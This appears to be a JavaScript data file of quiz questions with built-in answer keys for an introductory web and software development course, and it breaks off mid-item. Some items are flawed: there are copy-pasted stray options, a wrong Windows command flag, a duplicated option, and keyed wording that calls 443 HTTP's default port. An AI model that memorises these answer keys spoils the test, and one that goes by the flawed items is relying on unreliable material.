//difference between 'console.log()' and 'alert()'
addSingleQuestionToMath(
  null,
  "%s is when a program tries to %s.",
  [
    ["Duck typing", "figure out what an object is by checking some of its characteristics"],
    ["Duck and cover", "overload an external system then disconnect from that system"],
    ["Duck dinner", "provision the maximum resources that it can"],
    ["Duck, duck, goose", "identify which component is offline"],
    ["Duck eggs", "collect integration test results"]
  ]
);
addSingleQuestionToMath(
  null,
  "For coding, programmers primarily interact with %s where each character entered from the keyboard corresponds to %s in source code files.",
  [
    ["text files", "exactly one character"],
    ["word processor files", "exactly one character"],
    ["text files", "an XML element"],
    ["word processor files", "an XML element"],
    ["word processor files", "a JSON object"]
  ]
);
addSingleQuestionToMath(
  null,
  "Commonly-used text editors for various operating systems include %s for Windows, %s for Mac, and %s for Linux/Unix.",
  [
    ["Notepad", "TextEdit", "vi"],
    ["Notepad", "vi", "TextEdit"],
    ["Word", "Pages", "LibraOffice"],
    ["PowerPoint", "Pages", "LibraOffice"],
    ["Word", "Pages", "Google Docs"]
  ]
);
addSingleQuestionToMath(
  null,
  "%s (which is an IDE which stands for %s) is an advanced text editor made especially for software engineers which has powerful features like %s.",
  [
    ["IntelliJ", "'Integrated Development Environment'", "debugging and easy integration with Git"],
    ["Notepad", "'Integrated Development Environment'", "Windows integration"],
    ["IntelliJ", "'Integrated Development Environment'", "Bitcoin mining"],
    ["Notepad", "'Isometric Debugging Environment'", "debugging and easy integration with Git"],
    ["IntelliJ", "'Isometric Debugging Environment'", "debugging and easy integration with Git"]
  ]
);
addSingleQuestionToMath(
  null,
  "A %s is a sequence of %s commands within a file that %s.",
  [
    ["shell script", "command-line", "can be conveniently run over and over"],
    ["Java file", "encryption", "is used to support the HTTPS protocol"],
    ["JSON file", "execution", "can be run from the command line"],
    ["text message", "social", "used for network graphs"],
    ["code review", "review", "reorders a pull request"]
  ]
);
addSingleQuestionToMath(
  createPreamble(null, ["Consider a shell script with just this one line in it -", "", "echo Hello World"]),
  "Running this shell script would %s. It's file extension on Windows would be %s and on Unix it would be %s.",
  [
    ["print 'Hello World' to the console", "*.bat", "*.sh"],
    ["copy message 'Hello World' to a remote server", "*.bat", "*.sh"],
    ["copy message 'Hello World' to a remote server", "*.sh", "*.bat"],
    ["confirm the value 'Hello World' in a database", "*.bat", "*.sh"],
    ["confirm the value 'Hello World' in a database", "*.sh", "*.bat"]
  ]
);
addSingleQuestionToMath(
  null,
  "The term '%s' refers to %s.",
  [
    ["whitespace", "keyboard characters like space, tab, and enter/return that fill a text file but aren't visible"],
    ["invisospace", "keyboard characters like space, tab, and enter/return that fill a text file but aren't visible"],
    ["voidspace", "unused disk space"],
    ["invisospace", "unused disk space"],
    ["whitespace", "unused disk space"]
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider a file with the contents below -",
      "",
      "<my_mind today=\"February 14\">",
      "  <!-- this is a comment and therefore ignored -->",
      "  <thoughts type=\"random\">",
      "    <thought>It's cold outside</thought>",
      "  </thoughts>",
      "  <thoughts type=\"organized\">",
      "    <thought>Go to work</thought>",
      "    <thought>Buy flowers</thought>",
      "    <thought>Take spouse out to dinner</thought>",
      "  </thoughts>",
      "  <thoughts type=\"politics\" />",
      "</my_mind>"
    ]),
  [
    createSingleQuestion(
      "This is %s which is a %s file that represents a %s data structure.",
      [
        ["XML", "text", "hierarchical"],
        ["JSON", "text", "hierarchical"],
        ["SQL", "binary", "graph"],
        ["JSON", "binary", "hierarchical"],
        ["XML", "binary", "hierarchical"]
      ]),
    createSingleQuestion(
      "The 'type' %s is assigned to each 'thoughts' %s.",
      [
        ["attribute", "tag"],
        ["tag", "attribute"],
        ["comment", "tag"],
        ["comment", "attribute"],
        ["tag", "comment"]
      ]),
     createSingleQuestion(
       "'<thoughts type=\"random\">', '<thoughts type=\"organized\">', and '<thoughts type=\"politics\" />' each contain %s, %s, and %s elements, respectively.",
       [
         ["1", "3", "0"],
         ["1", "3", "infinite"],
         ["0", "0", "0"],
         ["1", "3", "undefined"],
         ["1", "3", "1"]
       ]),
     createSingleQuestion(
       "Overall, a good explanation of what this document represents is your %s on Valentine's Day (February 14) - %s.",
       [
         ["thoughts", "you notice how cold the day is, go to work then celebrate with your spouse without any thought of politics"],
         ["thoughts", "your mind is clear"],
         ["family", "you miss being with them"],
         ["thoughts", "notice how cold the day is, go to work then celebrate with your spouse some thought of politics"],
         ["thoughts", "you're mostly thinking about politics"]
       ])
  ]
);
addSingleQuestionToMath(
  null,
  "HTML files, which are used for %s, are a lot like %s files but in HTML %s like 'table' always mean the same thing.",
  [
    ["web pages", "XML", "tags"],
    ["databases", "CSV", "attributes"],
    ["configurations", "property", "properties"],
    ["invisospace", "unused disk space"],
    ["whitespace", "unused disk space"]
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider an HTML file with the contents below -",
      "",
      "<html>",
      "  <head>",
      "    <script>",
      "      alert('Hello World!');",
      "    </script>",
      "    <script>",
      "      alert('Hello World Again!');",
      "    </script>",
      "  </head>",
      "  <body>",
      "    Wow, those 'alert' commands are annoying!",
      "  </body>",
      "</html>"
    ]),
  [
     createSingleQuestion(
       "A well-formed HTML page will have '%s' as its root element while styling and JavaScipt functions will generally be defined within the '%s' element while the visible components of the page will be embedded in the '%s' element.",
       [
         ["html", "head", "body"],
         ["html", "script", "body"],
         ["xhtml", "script", "div"],
         ["xhtml", "head", "body"],
         ["xhtml", "script", "div"]
       ]),
     createSingleQuestion(
       "A Production web page generally %s use 'alert' commands because they %s.",
       [
         ["does not", "create generic and annoying pop-up messages"],
         ["does", "informative"],
         ["does not", "require an encryption file"],
         ["does", "provide valuable troubleshooting information"],
         ["does", "they track the user's actions with cookies"]
       ]),
     createSingleQuestion(
       "The hierarchical arrangement of %s on a web page is referred to as the %s.",
       [
         ["elements", "DOM (Document Object Model)"],
         ["stylings", "SHA (Styling Hierarchical Arrangement)"],
         ["alerts", "AR (Alert Repository)"],
         ["scripts", "AC (Action Dynamic)"],
         ["tables", "TG (Table Grid)"]
       ])
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider an HTML file with the contents below -",
      "",
      "<html>",
      "  <head>",
      "    <style>",
      "      p {",
      "        font-size: 18pt;",
      "      }",
      "      p.blue_text {",
      "        color: blue;",
      "      }",
      "      p#C {",
      "        font-style: italic;",
      "      }",
      "    </style>",
      "  </head>",
      "  <body>",
      "    <p id=\"A\">All paragraphs have large text</p>",
      "    <p id=\"B\" class=\"blue_text\">Some paragraphs have blue text</p>",
      "    <p id=\"C\" class=\"blue_text\">Just this paragraph has italicized text</p>",
      "  </body>",
      "</html>"
    ]),
  [
    createSingleQuestion(
      "The contents written within 'style' tags are written in %s language.",
      [
        ["CSS (Cascading Style Sheet)"],
        ["JavaScript"],
        ["SO (Styling Overdraft)"],
        ["FT (Font Transform)"],
        ["HA (HTML Arrangement)"]
      ]),
    createSingleQuestion(
      "For an HTML element, the value of its 'id' attribute %s.",
      [
        ["shouldn't be shared by any other element on the web page"],
        ["should be shared by other elements on the web page"],
        ["should always be a number"],
        ["must be in hexadecimal"],
        ["should be encrypted"]
      ]),
    createSingleQuestion(
      "The 'p.blue_text' declaration means that all 'p' tags %s will display their text in blue.",
      [
        ["with 'class=\"blue_text\"'"],
        ["without 'class=\"blue_text\"'"],
        ["with 'class=\"blue_text\"' but without an 'id' attribute"],
        ["with 'id' attribute equaling 'A'"],
        ["without exception"]
      ])
  ]
);
addSingleQuestionToMath(
  null,
  "For UI web developers, the '%s' tag is preferable to the '%s' tag because the '%s' tag %s.",
  [
    ["div", "table", "div", "allows greater styling flexibility, including having different web page layouts for laptops and mobile devices"],
    ["table", "div", "table", "allows greater styling flexibility, including having different web page layouts for laptops and mobile devices"],
    ["div", "table", "div", "can make AJAX calls but the 'table' tag can't"],
    ["table", "div", "table", "has been used by web developers for a longer time"],
    ["table", "div", "table", "has a very rigid layout"]
  ]
);
addSingleQuestionToMath(
  null,
  "The '%s', '%s', and '%s' tags are used for %s, %s, and %s, respectively.",
  [
    ["span", "img", "a", "inline styling", "displaying images", "declaring hyperlinks"],
    ["span", "img", "a", "declaring hyperlinks", "displaying images", "inline styling"],
    ["hr", "img", "a", "declaring hyperlinks", "inline styling", "displaying images"],
    ["span", "hr", "a", "displaying images", "inline styling", "declaring hyperlinks"],
    ["span", "img", "hr", "inline styling", "displaying images", "declaring hyperlinks"]
  ]
);
addSingleQuestionToMath(
  null,
  "Cloud computing is renting computer capacity instead of buying and maintaining it yourself.",
  [
    []
  ]
);
addSingleQuestionToMath(
  null,
  "Cloud computing allows a company to focus on its 'core competencies' and quickly change its computing capacity.",
  [
    []
  ]
);
addSingleQuestionToMath(
  null,
  "AWS is Amazon's cloud computer service and, as of late 2019, its largest source of profit.",
  [
    []
  ]
);
addSingleQuestionToMath(
  null,
  "The advantages of hosting an application in multiple AWS regions include faster response times and resiliency.",
  [
    []
  ]
);
addSingleQuestionToMath(
  null,
  "S3 is the AWS service that acts as a cloud-based file system.",
  [
    []
  ]
);
addSingleQuestionToMath(
  null,
  "Source code is the raw material for a project but generally doesn't include media, library, and compiled files.",
  [
    []
  ]
);
addSingleQuestionToMath(
  null,
  "Source-code repositories allow developers on the same team to coordinate their file changes to a software project.",
  [
    []
  ]
);
addSingleQuestionToMath(
  null,
  "Git is the distributed source-code repository, which means that all project users get a complete copy of the repository.",
  [
    []
  ]
);
addSingleQuestionToMath(
  null,
  "Git makes working on new features ('branching') and then integrating them ('merging') easy.",
  [
    []
  ]
);
addSingleQuestionToMath(
  createPreamble(
    null,
    [
      "@media screen and (max-width: 500px)"
    ]),
  "The above statement allows CSS to change the layout of a web page for screen widths no greater than 500 pixels.",
  [
    []
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider the following JavaScript function -",
      "",
      "function getWeatherForecast(cloudCoveragePercentage) {",
      "  if (cloudCoveragePercentage < 10) {",
      "    return \"sunny\";",
      "  } else if (cloudCoveragePercentage < 40) {",
      "    return \"partly cloudy\";",
      "  } else if (cloudCoveragePercentage < 75) {",
      "    return \"mostly cloudy\";",
      "  } else {",
      "    return \"cloudy\";",
      "  }",
      "}"
    ]),
  [
    createSingleQuestion(
      "If 'cloudCoveragePercentage' equals %s, then this function will return \"%s\".",
      [
        ["5", "sunny"],
        ["5", "mostly cloudy"],
        ["60", "sunny"],
        ["60", "cloudy"],
        ["60", "partly cloudy"]
      ]),
    createSingleQuestion(
      "If 'cloudCoveragePercentage' equals %s, then this function will return \"%s\".",
      [
        ["60", "mostly cloudy"],
        ["60", "sunny"],
        ["60", "cloudy"],
        ["5", "cloudy"],
        ["5", "partly cloudy"]
      ]),
    createSingleQuestion(
      "If 'cloudCoveragePercentage' equals %s, then this function will return \"%s\".",
      [
        ["90", "cloudy"],
        ["90", "sunny"],
        ["90", "cloudy"],
        ["35", "cloudy"],
        ["35", "sunny"]
      ])
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider the following JavaScript function -",
      "",
      "function getRandomWholeNumberUnder(range) {",
      "    return Math.floor(Math.random()*range);",
      "}"
    ]),
  [
    createSingleQuestion(
      "The function 'Math.random()' returns a random number from %s.",
      [
        ["0 up to but not including 1"],
        ["1 up to infinity"],
        ["negative infinity to infinity"],
        ["0 to infinity"],
        ["0 up to but not including 10"]
      ]),
    createSingleQuestion(
      "'Math.floor(0)', 'Math.floor(1.1)', 'Math.floor(7.99)', and 'Math.floor(8.5) will return %s, %s, %s, and %s, respectively'.",
      [
        ["0", "1", "7", "8"],
        ["0", "0", "0", "0"],
        ["0", "1", "8", "8"],
        ["0", "1", "8", "9"],
        ["0", "2", "8", "9"]
      ]),
    createSingleQuestion(
      "If 'range' has a value of 10, this function will return %s.",
      [
        ["a random whole number (no decimal) between 0 and 9"],
        ["a random whole number (no decimal) between 1 and 9"],
        ["a random decimal between 0 and up to but not including 10"],
        ["a random whole number (no decimal) between 0 and 10"],
        ["a random decimal between 0 and up to but not including 9"]
      ])
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider the following HTML file -",
      "",
      "<html>",
      "  <head>",
      "  </head>",
      "  <body>",
      "    <img id=\"p\" onclick=\"console.log('Welcome')\"/>",
      "    <div id=\"m\"/>",
      "    <script>",
      "      document.getElementById('p').src = 'https://www.si.edu/sites/default/files/historic-castle-400.jpg';",
      "      document.getElementById('m').innerHTML = 'Hello Friends!';",
      "    </script>",
      "  </body>",
      "</html>"
    ]),
  [
    createSingleQuestion(
      "The above JavaScript statements will %s and %s.",
      [
        ["display a picture of a castle", "display 'Hello Friends!' on the web page"],
        ["downloads text about a castle", "display 'Hello Friends!' on the web page"],
        ["downloads text about a castle", "open a pop-up window"],
        ["downloads text about a castle", "set the page title to 'Hello Friends!'"],
        ["display a picture of a castle", "set the page title to 'Hello Friends!'"]
      ]),
    createSingleQuestion(
      "In Chrome, clicking the mouse on the %s will display 'Welcome' %s.",
      [
        ["picture", "in Developer Tools"],
        ["text", "in a pop-up window"],
        ["text", "in the page title"],
        ["text", "just after 'Hello Friends!'"],
        ["picture", "in a pop-up window'"]
      ])
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider the following JavaScript statement -",
      "",
      "var person = {",
      "  \"name\": \"Prince Harry\",",
      "  \"hairColor\": \"red\",",
      "  \"isWorkday\": function(dayOfWeek) {",
      "    return (dayOfWeek != \"Saturday\" && dayOfWeek != \"Sunday\");",
      "  },",
      "  \"royalty\": true,",
      "  \"yearOfBirth\": 1984,",
      "  \"siblings\": [",
      "    {",
      "      \"name\": \"Prince William\"",
      "    }",
      "  ],",
      "};"
    ]),
  [
    createSingleQuestion(
      "'console.log(person.name)' + will print '%s'.",
      [
        ["Prince Harry"],
        ["red"],
        ["[string]"],
        ["undefined"],
        ["person"]
      ]),
    createSingleQuestion(
      "'console.log(\"I \" + ((person.royalty)? \"am\" : \"am not\") + \" royalty.\")' will print '%s'",
      [
        ["I am royalty."],
        ["I am not royalty."],
        ["[string]"],
        ["undefined"],
        ["true"]
      ]),
    createSingleQuestion(
      "'console.log(person.siblings.length)' will print '%s'.",
      [
        ["1"],
        ["0"],
        ["14"],
        ["4"],
        ["undefined"]
      ]),
    createSingleQuestion(
      "'console.log(person.isWorkday(\"Wednesday\"))' will print '%s'.",
      [
        ["true"],
        ["Wednesday"],
        ["Saturday"],
        ["Sunday"],
        ["undefined"]
      ])
  ]
);
addSingleQuestionToMath(
  createPreamble(
    null,
    [
      "Consider the following JavaScript statements -",
      "",
      "var a = /^hello/;",
      "console.log(a.test('hello there'));",
      "console.log(a.test('hi and good morning'));"
    ]),
  "The variable 'a' represents %s which is quite useful for %s, these statements will print %s.",
  [
    ["a regular expression", "pattern matching", "'true' then 'false'"],
    ["a regular expression", "pattern matching", "'false' then 'true'"],
    ["assortment", "pattern matching", "'true' twice"],
    ["assortment", "pattern matching", "'false' twice"],
    ["a regular expression", "hashing", "two hexadecimal numbers"]
  ]
);
addSingleQuestionToMath(
  null,
  "In software development, libraries are %s used because they %s.",
  [
    ["heavily", "save time, improve quality, new team members require less training"],
    ["hardly", "save time, improve quality, new team members require less training"],
    ["heavily", "software departments have an incentive to spend their budgets"],
    ["hardly", "software engineers want to have full control over all aspects of the application"],
    ["hardly", "slow down the build process"]
  ]
);
addSingleQuestionToMath(
  null,
  "While libraries %s, frameworks (like %s) %s.",
  [
    ["assist developers in getting something done", "React and Angular", "direct developers how it will be done"],
    ["make software development harder", "Lodash", "make it easier"],
    ["make software development harder", "React and Angular", "make it easier"],
    ["are hard to learn", "Lodash", "are easier to learn"],
    ["are hard to learn", "React and Angular", "are easier to learn"]
  ]
);
addSingleQuestionToMath(
  null,
  "Concerning software projects, business requirements %s while technical specifications %s.",
  [
    ["state what should be done", "how it will be done"],
    ["identify budget", "determine budget allocation"],
    ["largely ignored by everyone", "determine where coding will take place"],
    ["are written by MBAs", "are written by PhDs"],
    ["are supposed to be written after project completion", "should be approved before a project starts"]
  ]
);
addSingleQuestionToMath(
  null,
  "Wireframes provide a %s to understand %s in a proposed application.",
  [
    ["simplified picture of how a web page should look and are used", "what's important and missing"],
    ["simplified picture of how a web page should look and are used", "how to code"],
    ["tutorial", "how to code"],
    ["schedule", "time commitments"],
    ["statement of work", "budget allocation"]
  ]
);
addSingleQuestionToMath(
  null,
  "For larger software projects involving several teams, it's important that everyone %s.",
  [
    ["generally agrees about its goals and deliverables"],
    ["wears the same uniform"],
    ["went to the same school"],
    ["stops work at the same time of day"],
    ["agrees to use tabs or spaces for indentation"]
  ]
);
addSingleQuestionToMath(
  null,
  "%s are the hardware components on machines that allow %s and each one is assigned %s.",
  [
    ["Network Interface Cards (NICs)", "them to communicate over the Internet", "a 12-digit hexadecimal number"],
    ["No Intruder Cards (NICs)", "them prevent security breaches", "a 12-digit hexadecimal number"],
    ["Network Interface Cards (NICs)", "them to communicate over the Internet", "a 5-digit numbers"],
    ["No Intruder Cards (NICs)", "them prevent security breaches", "a 5-digit numbers"],
    ["No Intruder Cards (NICs)", "them prevent security breaches", "encrypted passwords"]
  ]
);
addSingleQuestionToMath(
  null,
  "Hexadecimal is a lot like decimal, %s each digit position is %s the one that proceeded it with letters %s representing numbers %s, respectively.",
  [
    ["except that", "16 times greater than ", "A, B, C, D, E, and F", "10, 11, 12, 13, 14, and 15"],
    ["except that", "12 times greater than ", "A and B", "10 and 11"],
    ["with", "still being 10 times greater than", "5, 6, 7, 8, 9, and 15", "A, B, C, D, E, and F"],
    ["except that", "8 times greater than ", "A, B, C, D, E, F, G, and H", "0, 1, 2, 3, 4, 5, 6, and 7"],
    ["except that", "14 times greater than ", "A, B, C, and D", "10, 11, 12, and 13"]
  ]
);
addSingleQuestionToMath(
  null,
  "DHCP is a protocol that assigns %s to %s.",
  [
    ["an IP address", "a NIC"],
    ["a NIC", "a computer"],
    ["a screen", "a computer"],
    ["an email address", "a user account"],
    ["a printer", "the network"]
  ]
);
addSingleQuestionToMath(
  null,
  "The command 'ipconfig -a' on Windows ('ifconfig -a' on Mac/Linux) lists %s including '%s' which is a special IP address meaning '%s'.",
  [
    ["a machine's network configuration settings", "127.0.0.1 (loopback address)", "this machine"],
    ["a machine's network configuration settings", "192.168.0.0 (loopback address)", "this machine"],
    ["a machine's network configuration settings", "192.168.0.0 (loopback address)", "network gateway"],
    ["a machine's network configuration settings", "admin.reset", "restart gateway"],
    ["directory contents", "/etc/hosts", "IP address index"]
  ]
);
addSingleQuestionToMath(
  null,
  "The command '%s google.com' will %s 'google.com'.",
  [
    ["nslookup", "print the IP address of domain name"],
    ["sendcookies", "send cookies to"],
    ["getcookies", "get cookies from"],
    ["synccookies", "both send cookies to and receive cookies from"],
    ["restrictip", "prevent access to"]
  ]
);
addSingleQuestionToMath(
  createPreamble(
    null,
    [
      "Consider the following diagram where a browser searches for 'weather' and the search engine then contacts the National Weather Service to get weather information to send back to the browser -",
      "",
      "Browser",
      "  -- Search 'weather' -->",
      "                       Search Engine",
      "                         -- Get weather forecast -->",
      "                                                  National Weather Service",
      "                         <--   Weather forecast   --",
      "                       Search Engine",
      "  <-- Weather HTML Page --",
      "Browser"
    ]),
  "When receiving the request from the browser, the search engine acts as a %s. When making the request to the National Weather Service, the search engine acts as a %s.",
  [
    ["server", "client"],
    ["localhost", "server"],
    ["client", "client"],
    ["client", "server"],
    ["localhost", "client"]
  ]
);
addSingleQuestionToMath(
  null,
  "The '%s' command will make %s, but won't %s.",
  [
    ["curl", "HTTP calls just like a browser", "present the responses in a format that people can interact with"],
    ["snarl", "sounds", "speak"],
    ["snarl", "new files", "delete old ones"],
    ["snarl", "files smaller", "remove content"],
    ["curl", "files smaller", "remove content"]
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider what would happen when entering in the following URL into a browser's address bar -",
      "",
      "https://www.google.com:443/search?q=best+songs+by+Hall+%26+Oates"
    ]),
  [
    createSingleQuestion(
      "The browser will use the HTTPS protocol (%s) to call the %s for 'www.google.com'.",
      [
        ["the encrypted version of HTTP", "IP address"],
        ["the unencrypted version of HTTP", "mock server"],
        ["the unencrypted version of HTTP", "gateway"],
        ["the unencrypted version of HTTP", "cloud"],
        ["the unencrypted version of HTTP", "MAC address"]
      ]),
    createSingleQuestion(
      "The ':443' part of the URL refers to the target %s which %s necessary because %s is the default %s for HTTP",
      [
        ["port", "isn't", "443", "port"],
        ["port", "is", "80", "port"],
        ["caching strategy", "is", "80", "caching strategy"],
        ["timeout setting", "isn't", "443", "timeout setting"],
        ["timeout setting", "is", "80", "timeout setting"]
      ]),
    createSingleQuestion(
      "If the '/search' %s and 'q' %s are the correct way to perform a search, this URL will search for '%s'.",
      [
        ["path", "query parameter", "best songs by Hall & Oates"],
        ["path", "query parameter", "best+songs+by+Hall+%26+Oates"],
        ["query parameter", "path", "best songs by Hall & Oates"],
        ["query parameter", "path", "best+songs+by+Hall+%26+Oates"],
        ["query parameter", "path", "best+songs+by+Hall+&+Oates"]
      ])
  ]
);
addSingleQuestionToMath(
  null,
  "The four major 'CRUD' ('%s') operations for HTTP are in order %s, with %s by far being the most common for casual browser usage.",
  [
    ["Create, Read, Update, Delete", "Post, Get, Put, and Delete", "Get"],
    ["Create, Read, Update, Delete", "Post, Get, Put, and Delete", "Put"],
    ["Curl, Rest, Undo, Dismiss", "Post, Get, Put, and Delete", "Get"],
    ["Curl, Rest, Undo, Dismiss", "Create, Read, Update, and Delete", "Delete"],
    ["Curl, Rest, Undo, Dismiss", "Create, Read, Update, and Delete", "Update"]
  ]
);
addSingleQuestionToMath(
  null,
  "After downloading the web page, if it references other internet files like media, JavaScript, and CSS, the browser will %s.",
  [
    ["immediately make individual HTTP calls to get those things"],
    ["not render the page at all (page will be blank)"],
    ["close"],
    ["present a menu of options"],
    ["open a tab"]
  ]
);
addSingleQuestionToMath(
  null,
  "Both HTTP requests and responses %s include %s.",
  [
    ["can", "headers and a body"],
    ["can", "headers but not a body"],
    ["can", "a body but not headers"],
    ["can't", "headers and a body"],
    ["can't", "text"]
  ]
);
addSingleQuestionToMath(
  null,
  "%s of '%s' and '%s' correspond to %s and %s, respectively.",
  [
    ["Mime types", "text/html", "application/json", "HTML", "JSON"],
    ["Encryption types", "text/html", "application/json", "HTML", "JSON"],
    ["Mime types", "microsoft/word", "application/json", "Word", "JavaScript"],
    ["Encryption types", "microsoft/word", "application/json", "Word", "JavaScript"],
    ["Computer types", "microsoft/word", "application/json", "Word", "JavaScript"]
  ]
);
addSingleQuestionToMath(
  null,
  "An HTTP response code from 200-299 indicates %s, with 200 meaning '%s'.",
  [
    ["Success", "OK"],
    ["Success", "Defined"],
    ["Failure", "Error"],
    ["Failure", "Rejection"],
    ["Failure", "Unauthorized"]
  ]
);
addSingleQuestionToMath(
  null,
  "An HTTP response code from 400-499 indicates %s, with 400, 401, 403, and 404 meaning '%s', '%s', '%s', and '%s', respectively.",
  [
    ["Client Error", "Bad Request", "Unauthorized", "Forbidden", "Not Found"],
    ["Server Error", "Bad Gateway", "No Response", "Busy", "Unexpected Error"],
    ["Success", "OK", "Done", "No Content", "Accepted"],
    ["Server Error", "Bad Request", "Unauthorized", "Forbidden", "Not Found"],
    ["General Error", "Bad Gateway", "No Response", "Busy", "Unexpected Error"],
  ]
);
addSingleQuestionToMath(
  null,
  "An HTTP response code from 500-599 indicates %s, with 500 meaning '%s' (%s).",
  [
    ["Server Error", "Internal Server Error", "commonly used to indicate an unexpected problem, like a software bug"],
    ["Client Error", "Bad Request", "like invalid input"],
    ["Failure", "Bad Certificate", "self-signed"],
    ["Success", "OK", "call was successful"],
    ["General Error", "Unknown Cause", "to be determined"],
  ]
);
addSingleQuestionToMath(
  null,
  "%s are a way of %s HTTP calls.",
  [
    ["Cookies", "maintaining state and session between"],
    ["Targets", "specializing"],
    ["Habits", "standardizing"],
    ["Rentals", "classifying"],
    ["Qubits", "simplifying"],
  ]
);
addSingleQuestionToMath(
  null,
  "Node.js, the %s version of JavaScript, uses 'npm' to organize projects and prevent '%s'.",
  [
    ["non-browser", "cowboy coding"],
    ["commercial", "public distribution"],
    ["Windows", "tampering"],
    ["Java", "type errors"],
    ["Unix", "vendor lock-in"],
  ]
);
addSingleQuestionToMath(
  null,
  "The 'npm install express --save' command will %s.",
  [
    ["downloads the 'express' (web server library) and indicates that the project depends on it in the 'package.json' file"],
    ["quickly completes the installation of 'npm' and saves the configuration file to repeat the installation"],
    ["uploads the 'express' library to a Maven repository"],
    ["open up a command prompt to enter JavaScript commands"],
    ["install files that improve the speed of 'npm'"],
  ]
);
//https://jsonplaceholder.typicode.com/todos/1
addPartToMath(
  createPreamble(
    null,
    [
      "Consider these contents at https://jsonplaceholder.typicode.com/todos/1 -",
      "",
      "{",
      "  \"userId\": 1,",
      "  \"id\": 1,",
      "  \"title\": \"delectus aut autem\",",
      "  \"completed\": false",
      "}",
      "",
      "Consider this jQuery statement -",
      "",
      "$(document).ready(function() {",
      "  $.get(",
      "    {",
      "      url: \"https://jsonplaceholder.typicode.com/todos/1\",",
      "      success: function(data, status) {",
      "        console.log(data.title);",
      "      }",
      "    }",
      "  );",
      "});"
    ]),
  [
    createSingleQuestion(
      "It will make %s call %s the page is downloaded.",
      [
        ["an AJAX (Asynchronous JavaScript and XML)", "after"],
        ["an AJAX (Asynchronous JavaScript and XML)", "before"],
        ["RAM (Random Access Memory)", "after"],
        ["RAM (Random Access Memory)", "before"],
        ["RAM (Random Access Memory)", "while"]
      ]),
    createSingleQuestion(
      "If the call %s, it will %s.",
      [
        ["is successful", "print 'delectus aut autem'"],
        ["is successful", "print '1'"],
        ["is successful", "print a string representation of a JSON object"],
        ["fails", "print 'delectus aut autem'"],
        ["fails", "print a string representation of a JSON object"]
      ]),
    createSingleQuestion(
      "This class of call allows a browser %s.",
      [
        ["to update a web page and send client actions to a server without reloading the whole web page"],
        ["to update a web page and send client actions to a server causing the whole web page to reload"],
        ["wait for user input"],
        ["open tabs without the user's permission"],
        ["to send client actions to a server causing the whole web page to reload"]
      ])
  ]
);
addSingleQuestionToMath(
  createPreamble(
    null,
    [
      "Consider the following Java program -",
      "",
      "public class sample12 {",
      "  public static void main(String[] args) {",
      "    System.out.println(\"Hello World!\");",
      "  }",
      "}"
    ]),
  "This program will %s but it highlights %s.",
  [
    ["print 'Hello World!'", "a common complaint that Java requires 'too much ceremony' to get anything done"],
    ["crash", "the robustness of Java"],
    ["fail to compile because of missing libraries", "the modularity of the Java language"],
    ["send a message to a queue", "the simplicity of Java"],
    ["hang", "the power of Java"]
  ]
);
addSingleQuestionToMath(
  null,
  "For a Spring Boot project, running the Maven command 'clean package spring-boot:repackage' will %s.",
  [
    ["create a ready-to-run 'fat JAR' containing everything necessary (including libraries) to run an application"],
    ["create a ready-to-run 'fat JAR' containing everything necessary (except libraries) to run an application"],
    ["create a specification file that other languages to use to interface with the application"],
    ["delete the application from source control"],
    ["deploy the application to a production server"]
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider these Spring Boot classes which are running on a local server with base URL http://localhost:8080 -",
      "",
      "//Class 1",
      "package com.example.demo;",
      "",
      "import org.springframework.stereotype.Service;",
      "",
      "@Service",
      "public class SuperComputer {",
      "    public int addNumbers(int numberOne, int numberTwo) {",
      "        return numberOne + numberTwo;",
      "    }",
      "}",
      "",
      "//Class 2",
      "package com.example.demo;",
      "",
      "import org.springframework.beans.factory.annotation.Autowired;",
      "import org.springframework.stereotype.Controller;",
      "import org.springframework.web.bind.annotation.GetMapping;",
      "import org.springframework.web.bind.annotation.RequestParam;",
      "import org.springframework.web.bind.annotation.ResponseBody;",
      "",
      "@Controller",
      "public class DemoController {",
      "",
      "    @Autowired",
      "    SuperComputer superComputer;",
      "",
      "    @GetMapping(\"/addNumbers\")",
      "    @ResponseBody",
      "    public String addNumbers(",
      "            @RequestParam(name = \"numberOne\") int numberOne,",
      "            @RequestParam(name = \"numberTwo\") int numberTwo) {",
      "        return \"The answer to your question is \"",
      "                + superComputer.addNumbers(numberOne, numberTwo);",
      "    }",
      "}"
    ]),
  [
    createSingleQuestion(
      "If 'http://localhost:8080/addNumbers?numberOne=5&numberTwo=2' is entered into the browser address bar, it will display %s.",
      [
        ["'The answer to your question is 7'"],
        ["nothing"],
        ["a JSON object"],
        ["an error message"],
        ["'The answer to your question is null'"]
      ]),
    createSingleQuestion(
      "The '@Autowired' annotation is an example of '%s' which has the advantages of %s.",
      [
        ["inversion of control", "clearer code and making components more interchangeable"],
        ["inversion of control", "reducing licensing fees"],
        ["inversion of control", "users in control of the system"],
        ["self-documenting code", "generating documentation and specifications for web services"],
        ["self-documenting code", "will generate the functionality of 'SuperComputer' from specifications"]
      ])
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider this class -",
      "",
      "package com.example.demo;",
      "",
      "import org.junit.jupiter.api.Assertions;",
      "import org.junit.jupiter.api.Test;",
      "import org.mockito.Mockito;",
      "",
      "import static org.mockito.ArgumentMatchers.eq;",
      "import static org.mockito.Mockito.when;",
      "",
      "public class DemoControllerTest {",
      "    @Test",
      "    public void testController() {",
      "        //",
      "        SuperComputer superComputer = Mockito.mock(SuperComputer.class);",
      "        when(superComputer.addNumbers(eq(1), eq(2))).thenReturn(3);",
      "        //",
      "        DemoController demoController = new DemoController();",
      "        demoController.superComputer = superComputer;",
      "        //",
      "        String response = demoController.addNumbers(1, 2);",
      "        Assertions.assertEquals(\"The answer to your question is 3\", response);",
      "    }",
      "}"
    ]),
  [
    createSingleQuestion(
      "This class is a %s for the %s class.",
      [
        ["unit test", "DemoController"],
        ["unit test", "SuperComputer"],
        ["live test", "DemoController"],
        ["live test", "SuperComputer"],
        ["load test", "SuperComputer"]
      ]),
    createSingleQuestion(
      "The %s class is %s.",
      [
        ["SuperComputer", "mocked (like a crash test dummy)"],
